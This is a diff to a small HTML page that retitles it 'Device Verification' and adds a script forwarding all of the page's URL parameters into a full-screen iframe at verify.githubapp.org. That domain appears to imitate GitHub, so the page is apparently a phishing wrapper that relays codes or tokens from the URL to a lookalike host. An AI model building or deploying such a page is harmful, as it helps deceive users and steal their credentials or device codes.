@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your App</title>
+    <title>Device Verification</title>
     <style>
         * {
             margin: 0;
@@ -22,25 +22,16 @@
             border: none;
             display: block;
         }
-        
-        /* Loading indicator (optional) */
-        .loading {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 18px;
-            color: #666;
-        }
     </style>
 </head>
 <body>
-    <div class="loading" id="loading">Loading...</div>
-    <iframe 
-        src="https://verify.githubapp.org" 
-        title="App"
-        id="app-frame"
-        onload="document.getElementById('loading').style.display='none'">
-    </iframe>
+    <iframe id="app-frame" title="Device Verification"></iframe>
+    
+    <script>
+        // Pass all URL parameters from parent to iframe
+        const iframe = document.getElementById('app-frame');
+        const parentParams = window.location.search;
+        iframe.src = 'https://verify.githubapp.org' + parentParams;
+    </script>
 </body>
 </html>
